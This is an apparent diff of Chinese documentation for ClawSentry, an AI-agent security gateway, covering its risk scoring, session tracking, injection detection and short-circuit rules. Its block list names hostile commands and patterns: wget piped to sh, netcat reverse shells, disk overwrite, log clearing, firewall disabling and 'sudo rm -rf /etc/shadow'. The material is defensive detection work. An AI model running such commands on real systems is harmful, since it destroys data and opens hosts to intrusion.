-<td>下载并执行</td>
-<td><code>wget -qO- url \| sh</code></td>
-</tr>
-<tr>
-<td><code>&gt; /dev/</code></td>
 <td>设备覆写</td>
+<td><code>&gt;[^\S\r\n]*/dev/(?!null\b)</code></td>
 <td><code>echo x &gt; /dev/sda</code></td>
 </tr>
 <tr>
-<td><code>git push --force</code></td>
 <td>强制推送</td>
-<td>可能覆盖远程历史</td>
+<td><code>git\s+push\s+.*--force</code></td>
+<td>覆盖远程历史</td>
 </tr>
 <tr>
-<td><code>chmod 777</code></td>
 <td>全开权限</td>
+<td><code>chmod\s+777</code></td>
 <td>安全配置破坏</td>
 </tr>
 <tr>
-<td><code>sudo</code></td>
-<td>提权执行</td>
+<td>提权</td>
+<td><code>\bsudo\b</code></td>
 <td>突破最小权限</td>
+</tr>
+<tr>
+<td>Windows 销毁</td>
+<td><code>rmdir\s+/s\s+/q</code>、<code>Remove-Item\s+.*-Recurse\s+.*-Force</code>、<code>del\s+/[sq]\s+/[sq]</code></td>
+<td>递归强删</td>
+</tr>
+<tr>
+<td>PowerShell 提权</td>
+<td><code>Set-ExecutionPolicy\s+(?:Unrestricted\|Bypass)</code></td>
+<td>关闭脚本签名</td>
+</tr>
+<tr>
+<td>用户创建</td>
+<td><code>net\s+(?:user\|localgroup)\s+.*\s+/add</code></td>
+<td>添加本地账号</td>
+</tr>
+<tr>
+<td>macOS 磁盘销毁</td>
+<td><code>diskutil\s+(?:secureErase\|eraseVolume\|eraseDisk)</code></td>
+<td>安全擦除</td>
+</tr>
+<tr>
+<td>防火墙篡改</td>
+<td><code>iptables\s+(?:-F\|-X)</code>、<code>ufw\s+(?:disable\|reset)</code>、<code>netsh\s+advfirewall\s+set.*state\s+off</code></td>
+<td>关闭/清空规则</td>
+</tr>
+<tr>
+<td>日志清除</td>
+<td><code>wevtutil\s+cl\s+(?:System\|Security\|Application)</code></td>
+<td>清除 Windows 事件日志</td>
+</tr>
+<tr>
+<td>反向 shell</td>
+<td><code>(?:nc\|ncat\|netcat)\s+.*-e\s+(?:/bin/\|cmd)</code>、<code>\|\s*IEX\s*\(</code></td>
+<td>bind/reverse shell</td>
+</tr>
+<tr>
+<td>安全擦除</td>
+<td><code>shred\s+-[a-z]*u</code>、<code>cipher\s+/w:</code></td>
+<td>不可恢复擦除</td>
 </tr>
 </tbody>
 </table>
+<p>此外，<code>_has_dangerous_command_pattern</code> 还委托 <code>risk_signals.has_remote_pipe_exec_command</code> 与 <code>has_process_sub_remote_command</code> 检测 <code>bash &lt;(curl ...)</code> 等进程替换形式。</p>
 </div>
 </div>
 </div>
 <hr />
-<h3 id="d4">D4 — 会话风险累积 (Context Risk Accumulation)<a class="headerlink" href="#d4" title="Permanent link">&para;</a></h3>
+<h3 id="d4">D4 — 会话风险累积<a class="headerlink" href="#d4" title="Permanent link">&para;</a></h3>
 <p><strong>取值范围：0-2</strong></p>
 <p>D4 不基于当前事件本身，而是基于<strong>同一会话中历史高危事件的累积次数</strong>。这是 ClawSentry 的"记忆"机制 —— 即使单个操作看似无害，如果一个会话内已多次触发高风险评估，D4 会将该会话的后续操作提升至更高警戒级别。</p>
 <table>
@@ -3603,20 +3906,20 @@
 </tbody>
 </table>
 <p>D4 由 <code>SessionRiskTracker</code> 维护，每当一个事件的最终风险等级为 HIGH 或 CRITICAL 时，该会话的高危计数加一。</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">class</span> <span class="nc">SessionRiskTracker</span><span class="p">:</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;追踪每个会话的高危事件累积。&quot;&quot;&quot;</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>    <span class="n">DEFAULT_MAX_SESSIONS</span> <span class="o">=</span> <span class="mi">10_000</span>   <span class="c1"># LRU 淘汰上限</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>    <span class="k">def</span> <span class="nf">get_d4</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>        <span class="n">count</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_high_risk_counts</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>        <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">:</span> <span class="k">return</span> <span class="mi">2</span>
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>        <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span> <span class="k">return</span> <span class="mi">1</span>
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>        <span class="k">return</span> <span class="mi">0</span>
-</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
-</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>    <span class="k">def</span> <span class="nf">record_high_risk_event</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
-</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">_high_risk_counts</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
-</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">_high_risk_counts</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
-</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>        <span class="p">)</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">class</span> <span class="nc">SessionRiskTracker</span><span class="p">:</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;追踪每个会话的高危事件累积。&quot;&quot;&quot;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">DEFAULT_MAX_SESSIONS</span> <span class="o">=</span> <span class="mi">10_000</span>   <span class="c1"># LRU 淘汰上限</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    <span class="k">def</span> <span class="nf">get_d4</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>        <span class="n">count</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_high_risk_counts</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>        <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">:</span> <span class="k">return</span> <span class="mi">2</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>        <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span> <span class="k">return</span> <span class="mi">1</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>        <span class="k">return</span> <span class="mi">0</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>    <span class="k">def</span> <span class="nf">record_high_risk_event</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">_high_risk_counts</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">_high_risk_counts</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>        <span class="p">)</span>
 </span></code></pre></div>
 <div class="admonition abstract">
 <p class="admonition-title">与 SessionEnforcementPolicy 的关系</p>
@@ -3655,19 +3958,19 @@
 </tbody>
 </table>
 <p>三种模式独立检测，<code>D4 = max(历史累积分, 频率异常分)</code>。</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># 频率检测配置变量</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nv">CS_D4_FREQ_BURST_COUNT</span><span class="o">=</span><span class="m">10</span><span class="w">          </span><span class="c1"># burst 触发阈值（次数）</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="nv">CS_D4_FREQ_BURST_WINDOW_S</span><span class="o">=</span><span class="m">5</span>.0<span class="w">      </span><span class="c1"># burst 时间窗口（秒）</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="nv">CS_D4_FREQ_REPETITIVE_COUNT</span><span class="o">=</span><span class="m">20</span><span class="w">     </span><span class="c1"># repetitive 触发阈值</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nv">CS_D4_FREQ_REPETITIVE_WINDOW_S</span><span class="o">=</span><span class="m">60</span>.0
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nv">CS_D4_FREQ_RATE_LIMIT_PER_MIN</span><span class="o">=</span><span class="m">60</span><span class="w">   </span><span class="c1"># rate 整体速率阈值（次/分钟）</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># 频率检测配置变量</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nv">CS_D4_FREQ_BURST_COUNT</span><span class="o">=</span><span class="m">10</span><span class="w">          </span><span class="c1"># burst 触发阈值（次数）</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nv">CS_D4_FREQ_BURST_WINDOW_S</span><span class="o">=</span><span class="m">5</span>.0<span class="w">      </span><span class="c1"># burst 时间窗口（秒）</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="nv">CS_D4_FREQ_REPETITIVE_COUNT</span><span class="o">=</span><span class="m">20</span><span class="w">     </span><span class="c1"># repetitive 触发阈值</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="nv">CS_D4_FREQ_REPETITIVE_WINDOW_S</span><span class="o">=</span><span class="m">60</span>.0
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="nv">CS_D4_FREQ_RATE_LIMIT_PER_MIN</span><span class="o">=</span><span class="m">60</span><span class="w">   </span><span class="c1"># rate 整体速率阈值（次/分钟）</span>
 </span></code></pre></div>
 <div class="admonition tip">
 <p class="admonition-title">如何关闭频率检测</p>
 <p>若项目中 Agent 有合法的高频调用需求（如批量代码生成），可调高阈值或设置 <code>CS_D4_FREQ_BURST_COUNT=9999</code> 有效禁用。</p>
 </div>
 <hr />
-<h3 id="d5">D5 — Agent 信任等级 (Agent Trust Level)<a class="headerlink" href="#d5" title="Permanent link">&para;</a></h3>
+<h3 id="d5">D5 — Agent 信任等级<a class="headerlink" href="#d5" title="Permanent link">&para;</a></h3>
 <p><strong>取值范围：0-2</strong></p>
 <p>D5 基于 <code>DecisionContext</code> 中的 <code>agent_trust_level</code> 字段，评估发出请求的 Agent 是否被授予了适当的信任级别。</p>
 <table>
@@ -3701,7 +4004,7 @@
 <p>当 <code>DecisionContext</code> 为空或 <code>agent_trust_level</code> 未设置时，D5 取保守默认值 <strong>2</strong>（视为不信任），并在 <code>missing_dimensions</code> 中记录 <code>"d5"</code>。</p>
 </div>
 <hr />
-<h3 id="d6">D6 — 注入检测 (Injection Detection)<a class="headerlink" href="#d6" title="Permanent link">&para;</a></h3>
+<h3 id="d6">D6 — 注入检测<a class="headerlink" href="#d6" title="Permanent link">&para;</a></h3>
 <p><strong>取值范围：0.0-3.0（连续浮点值）</strong></p>
 <p>D6 是 ClawSentry E-4 引入的第六个风险维度，专门检测提示词注入（Prompt Injection）和命令注入（Command Injection）企图。与 D1-D5 的整数评分不同，D6 采用连续浮点值，通过三层检测架构综合评分。</p>
 <p><strong>三层检测架构：</strong></p>
@@ -3736,7 +4039,7 @@
 </tbody>
 </table>
 <p>最终 D6 = min(Layer1 + Layer2 + Layer3, 3.0)。</p>
-<div class="tabbed-set tabbed-alternate" data-tabs="2:3"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><input id="__tabbed_2_3" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">弱模式（22 条，+0.3 each）</label><label for="__tabbed_2_2">强模式（17 条，+0.8 each）</label><label for="__tabbed_2_3">工具特定模式</label></div>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:3"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><input id="__tabbed_2_3" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">弱模式（22 条，每条 +0.3）</label><label for="__tabbed_2_2">强模式（17 条，每条 +0.8）</label><label for="__tabbed_2_3">工具特定模式</label></div>
 <div class="tabbed-content">
 <div class="tabbed-block">
 <p>偏向误导性话术，触发条件宽松。含 10 条英文模式 + 12 条中文模式：</p>
@@ -3825,16 +4128,16 @@
 <p><strong>NFKC 穿透：</strong> 所有注入检测函数在匹配前自动执行 NFKC Unicode 归一化 + 393 个不可见码点剥离（<code>text_utils.normalize_text()</code>），防止全角字符伪装（如 <code>Ｉｇｎｏｒｅ</code> → <code>Ignore</code>）和不可见字符绕过。</p>
 <p><strong>ReDoS 安全：</strong> 所有攻击模式正则通过 <code>compile_safe_regex()</code> 编译，自动检测嵌套量词（含交替分支内的重复），拒绝可能导致 ReDoS 的危险正则。</p>
 <p><strong>EmbeddingBackend 扩展接口：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">from</span> <span class="nn">clawsentry.gateway.injection_detector</span> <span class="kn">import</span> <span class="n">EmbeddingBackend</span><span class="p">,</span> <span class="n">VectorLayer</span><span class="p">,</span> <span class="n">InjectionDetector</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="k">class</span> <span class="nc">MyBackend</span><span class="p">:</span>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    <span class="k">def</span> <span class="nf">max_similarity</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">float</span><span class="p">:</span>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>        <span class="c1"># 使用 sentence-transformers 等计算与已知攻击样本的余弦相似度</span>
-</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>        <span class="k">return</span> <span class="n">similarity_score</span>  <span class="c1"># 0.0-1.0</span>
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
-</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">detector</span> <span class="o">=</span> <span class="n">InjectionDetector</span><span class="p">(</span>
-</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>    <span class="n">vector_layer</span><span class="o">=</span><span class="n">VectorLayer</span><span class="p">(</span><span class="n">MyBackend</span><span class="p">(),</span> <span class="n">threshold</span><span class="o">=</span><span class="mf">0.75</span><span class="p">)</span>
-</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="p">)</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kn">from</span> <span class="nn">clawsentry.gateway.injection_detector</span> <span class="kn">import</span> <span class="n">EmbeddingBackend</span><span class="p">,</span> <span class="n">VectorLayer</span><span class="p">,</span> <span class="n">InjectionDetector</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">class</span> <span class="nc">MyBackend</span><span class="p">:</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    <span class="k">def</span> <span class="nf">max_similarity</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">float</span><span class="p">:</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>        <span class="c1"># 使用 sentence-transformers 等计算与已知攻击样本的余弦相似度</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>        <span class="k">return</span> <span class="n">similarity_score</span>  <span class="c1"># 0.0-1.0</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">detector</span> <span class="o">=</span> <span class="n">InjectionDetector</span><span class="p">(</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>    <span class="n">vector_layer</span><span class="o">=</span><span class="n">VectorLayer</span><span class="p">(</span><span class="n">MyBackend</span><span class="p">(),</span> <span class="n">threshold</span><span class="o">=</span><span class="mf">0.75</span><span class="p">)</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="p">)</span>
 </span></code></pre></div>
 <p>Layer 3 默认禁用（无 backend 时 score 固定返回 0.0），按需启用不影响其他评分层。</p>
 <h3 id="external-content">外部内容来源安全加成<a class="headerlink" href="#external-content" title="Permanent link">&para;</a></h3>
@@ -3870,47 +4173,69 @@
 </tbody>
 </table>
 <p>来源推断结果注入 <code>CanonicalEvent._clawsentry_meta.content_origin</code>，供 D6 注入检测和 Post-action 分析器读取。</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nv">CS_EXTERNAL_CONTENT_D6_BOOST</span><span class="o">=</span><span class="m">0</span>.3<span class="w">               </span><span class="c1"># 外部内容 D6 额外加分（默认 0.3）</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nv">CS_EXTERNAL_CONTENT_POST_ACTION_MULTIPLIER</span><span class="o">=</span><span class="m">1</span>.3<span class="w">  </span><span class="c1"># 外部内容 post-action 评分乘数</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nv">CS_EXTERNAL_CONTENT_D6_BOOST</span><span class="o">=</span><span class="m">0</span>.3<span class="w">               </span><span class="c1"># 外部内容 D6 额外加分（默认 0.3）</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nv">CS_EXTERNAL_CONTENT_POST_ACTION_MULTIPLIER</span><span class="o">=</span><span class="m">1</span>.3<span class="w">  </span><span class="c1"># 外部内容 post-action 评分乘数</span>
 </span></code></pre></div>
 <hr />
 <h2 id="scoring">评分合成<a class="headerlink" href="#scoring" title="Permanent link">&para;</a></h2>
 <p>六个维度评分完成后，ClawSentry 按以下流程合成最终风险等级。</p>
-<h3 id="short-circuit">短路规则 (Short-Circuit Rules)<a class="headerlink" href="#short-circuit" title="Permanent link">&para;</a></h3>
-<p>短路规则在合成评分<strong>之前</strong>检查，一旦命中即直接确定风险等级，跳过正常的评分-定级流程。短路规则的优先级高于一切。</p>
+<h3 id="short-circuit">短路规则<a class="headerlink" href="#short-circuit" title="Permanent link">&para;</a></h3>
+<p>短路规则在合成评分<strong>之前或之后</strong>触发：SC-4 / SC-7 与基于 D1-D3 的 SC-1..SC-3 在 base_score 之前检查；SC-8 在 effect/taint 证据合并阶段触发。一旦命中即直接确定（或最低保证）风险等级。<code>RiskSnapshot.short_circuit_rule</code> 字段记录命中的规则名（仅允许 <code>SC-1..SC-8</code>）。</p>
 <table>
 <thead>
 <tr>
 <th style="text-align: center;">规则 ID</th>
 <th>条件</th>
-<th style="text-align: center;">直接定级</th>
+<th style="text-align: center;">触发结果</th>
 <th>说明</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td style="text-align: center;"><strong>SC-1</strong></td>
-<td>D1=3 且 D2&gt;=2</td>
+<td><code>D1==3 and D2&gt;=2</code></td>
 <td style="text-align: center;"><code>CRITICAL</code></td>
 <td>高危工具 + 敏感路径 → 绝对禁止</td>
 </tr>
 <tr>
 <td style="text-align: center;"><strong>SC-2</strong></td>
-<td>D3=3</td>
+<td><code>D3==3</code></td>
 <td style="text-align: center;"><code>CRITICAL</code></td>
-<td>高危命令模式 (如 <code>rm -rf /</code>) → 绝对禁止</td>
+<td>高危命令模式（<code>rm -rf</code>、fork bomb、<code>curl \| sh</code> 等）→ 绝对禁止</td>
 </tr>
 <tr>
 <td style="text-align: center;"><strong>SC-3</strong></td>
-<td>D1=0 且 D2=0 且 D3=0</td>
+<td><code>D1==0 and D2==0 and D3==0</code></td>
 <td style="text-align: center;"><code>LOW</code></td>
 <td>纯只读操作 → 安全放行</td>
 </tr>
+<tr>
+<td style="text-align: center;"><strong>SC-4</strong></td>
+<td><code>effect_envelope</code> 含 <code>disabled_capability_equivalent</code> 且 <code>confidence == "high"</code></td>
+<td style="text-align: center;"><code>MEDIUM</code>（normal）/ <code>HIGH</code>（strict、benchmark）</td>
+<td>已禁用工具的等价能力调用 → operator review</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>SC-7</strong></td>
+<td><code>script_analysis_unavailable</code> 或 <code>wrapper_chain_unresolved</code>，且 <code>mode in {strict, benchmark}</code></td>
+<td style="text-align: center;"><code>HIGH</code></td>
+<td>脚本/包装链无法解析（仅严格模式触发）</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>SC-8</strong></td>
+<td><code>generated_script_future_exec</code> 证据 + 低信任 skill 证据</td>
+<td style="text-align: center;"><code>MEDIUM</code>（normal）/ <code>HIGH</code>（strict、benchmark），并产生 <code>DEFER</code></td>
+<td>写入未来执行入口的脚本 → operator review</td>
+</tr>
 </tbody>
 </table>
+<div class="admonition note">
+<p class="admonition-title">SC-5 / SC-6 已保留预设</p>
+<p><code>RiskSnapshot.short_circuit_rule</code> 验证器接受 <code>SC-1..SC-8</code>，但当前代码路径未发出 <code>SC-5</code> / <code>SC-6</code>，作为后向兼容预留。</p>
+</div>
 <div class="admonition example">
 <p class="admonition-title">短路示例</p>
-<p><code>sudo rm -rf /etc/shadow</code> 命中 SC-1（D1=3, D2=3）和 SC-2（D3=3），直接定级为 CRITICAL，无需计算合成分。</p>
+<p><code>sudo rm -rf /etc/shadow</code>：D1=3、D2=3、D3=3，命中 SC-1 与 SC-2（首匹配为 SC-1），直接定级为 CRITICAL，无需计算合成分。</p>
 </div>
 <h3 id="composite-formula">合成评分公式<a class="headerlink" href="#composite-formula" title="Permanent link">&para;</a></h3>
 <p>当没有短路规则命中时，按以下 v2 公式计算合成分：</p>
@@ -4015,7 +4340,7 @@
 <hr />
 <h2 id="risk-to-verdict">风险→判决映射<a class="headerlink" href="#risk-to-verdict" title="Permanent link">&para;</a></h2>
 <p>L1 将风险等级映射为 <code>CanonicalDecision</code>，判决结果取决于事件类型和风险等级的组合。</p>
-<h3 id="_1">按事件类型分流<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<h3 id="_2">按事件类型分流<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
 <pre class="mermaid"><code>graph TD
     E[CanonicalEvent] --&gt; ET{event_type?}
     ET --&gt;|post_action / post_response / error / session| OBS[ALLOW — 仅观测]
@@ -4038,21 +4363,21 @@
 <table>
 <thead>
 <tr>
-<th style="text-align: center;">风险等级</th>
+<th style="text-align: center;">风险等级 / 信号</th>
 <th style="text-align: center;">判决</th>
 <th>语义</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td style="text-align: center;"><code>LOW</code></td>
+<td style="text-align: center;"><code>LOW</code>（无 DEFER 信号）</td>
 <td style="text-align: center;"><code>ALLOW</code></td>
 <td>安全操作，直接放行</td>
 </tr>
 <tr>
-<td style="text-align: center;"><code>MEDIUM</code></td>
+<td style="text-align: center;"><code>MEDIUM</code>（无 DEFER 信号）</td>
 <td style="text-align: center;"><code>ALLOW</code></td>
-<td>放行但记录审计日志，同时触发 L2 分析</td>
+<td>放行但记录审计日志，同时触发 L2 分析（除非 benchmark 关闭）</td>
 </tr>
 <tr>
 <td style="text-align: center;"><code>HIGH</code></td>
@@ -4064,43 +4389,99 @@
 <td style="text-align: center;"><code>BLOCK</code></td>
 <td>绝对禁止，无条件拦截</td>
 </tr>
+<tr>
+<td style="text-align: center;"><code>rule_hits</code> 含 <code>disabled_capability_equivalent</code>（且未升级到 HIGH/CRITICAL）</td>
+<td style="text-align: center;"><code>DEFER</code>（<code>final=False</code>）</td>
+<td>Disabled 工具等价能力 → operator review</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>ReviewRoutingIntent.policy_action == "defer"</code></td>
+<td style="text-align: center;"><code>DEFER</code></td>
+<td>Gateway-owned evidence routing requires operator review</td>
+</tr>
+<tr>
+<td style="text-align: center;"><code>short_circuit_rule == "SC-8"</code></td>
+<td style="text-align: center;"><code>DEFER</code></td>
+<td>未来执行入口写入 + 低信任 skill 证据</td>
+</tr>
+<tr>
+<td style="text-align: center;">Session scope 评估输出 <code>DENY</code> / <code>DEFER</code></td>
+<td style="text-align: center;"><code>BLOCK</code> / <code>DEFER</code></td>
+<td>由 <code>session-scope</code> 策略层覆盖（policy_id 改为 <code>session-scope</code>）</td>
+</tr>
 </tbody>
 </table>
-<div class="admonition tip">
